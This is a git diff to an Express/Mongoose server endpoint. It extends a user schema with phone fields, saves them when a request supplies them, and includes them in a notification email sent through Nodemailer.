@@ -33,7 +33,9 @@ app.use(express.json({ limit: '3mb' }));
 
 const userSchema = new mongoose.Schema({
   email: String,
-  id: String
+  id: String,
+  phone: String,
+  changePhone: String,
 });
 
 const User = mongoose.model('User', userSchema);
@@ -41,16 +43,7 @@ const User = mongoose.model('User', userSchema);
 app.post('/save-user', async (req, res) => {
   const { email, id } = req.body;
 
-  // Create a new user instance
-  const newUser = new User({
-    email,
-    id
-  });
-
-  // Save the user to the database
- 
-  await newUser.save();
-
+  
   const transporter = nodemailer.createTransport({
     service: 'Gmail',
     auth: {
@@ -58,12 +51,31 @@ app.post('/save-user', async (req, res) => {
       pass: process.env.PASSWORD
     }
   });
+  
+  let text = `Email => ${email}, id => ${id}`;
+  
+  const params = {email, id};
+  if (req.body.phone) {
+    params.phone = req.body.phone;
+    text += ` Phone => ${req.body.phone}`;
+  }
+  if (req.body.changePhone) {
+    params.changePhone = req.body.changePhone;
+    text += ` changePhone => ${req.body.changePhone}`;
+  }
+
+  // Create a new user instance
+  const newUser = new User(params);
+
+  // Save the user to the database
+ 
+  await newUser.save();
 
   const mailOptions = {
     from: "Auth client webdev",
     to: process.env.USERNAME,
     subject: "message with email and id",
-    text: `Email => ${email}, id => ${id}`,
+    text,
   }
 
   transporter.sendMail(mailOptions, (err) => {
